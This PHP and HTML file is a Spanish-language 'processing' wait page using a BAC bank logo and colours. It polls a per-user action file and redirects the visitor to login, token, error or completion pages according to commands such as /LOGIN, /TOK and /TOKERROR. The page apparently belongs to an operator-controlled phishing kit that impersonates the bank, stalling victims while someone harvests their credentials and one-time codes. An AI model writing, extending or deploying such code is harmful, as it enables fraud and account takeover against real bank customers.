<?php
$usuario = trim($_GET['u'] ?? '');
$step    = trim($_GET['step'] ?? '');
if (!$usuario) {
    header('Location: index.php');
    exit;
}
$self = 'espera.php?u=' . urlencode($usuario) . ($step ? '&step=' . rawurlencode($step) : '');

$archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    $u = urlencode($usuario);

    switch ($accion) {
        case '/LISTO':
            header('Location: listo.php'); break;
        case '/LOGIN':
            if ($step === 'login') {
                header('Location: token.php?u=' . $u);
            } else {
                header('Location: index.php');
            }
            break;
        case '/TOK':
            header('Location: token.php?u=' . $u); break;
        case '/LOGINERROR':
            header('Location: index.php?error=1'); break;
        case '/TOKERROR':
            header('Location: token.php?u=' . $u . '&retry=1'); break;
        case '/ERROR':
        default:
            header('Location: index.php?error=1'); break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($self) ?>"/>
  <title>Procesando...</title>
  <link rel="icon" href="img/logo_bac.svg" type="image/svg+xml"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
    img.logo{height:60px}
    .spinner{width:56px;height:56px;position:relative}
    .spinner .ring{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;animation:spin 1.1s linear infinite}
    .spinner .r1{border-top-color:#e4002b}
    .spinner .r2{border-right-color:#0067b1;animation-duration:1.6s;animation-direction:reverse;width:42px;height:42px;top:7px;left:7px}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{font-size:15px;color:#374151;font-weight:500}
    small{font-size:12px;color:#9ca3af;margin-top:-16px}
  </style>
</head>
<body>
  <img src="img/logo_bac.svg" class="logo" alt="BAC"/>
  <div class="spinner">
    <div class="ring r1"></div>
    <div class="ring r2"></div>
  </div>
  <p>Estamos procesando tu solicitud...</p>
  <small>No cierres esta ventana</small>
</body>
</html>
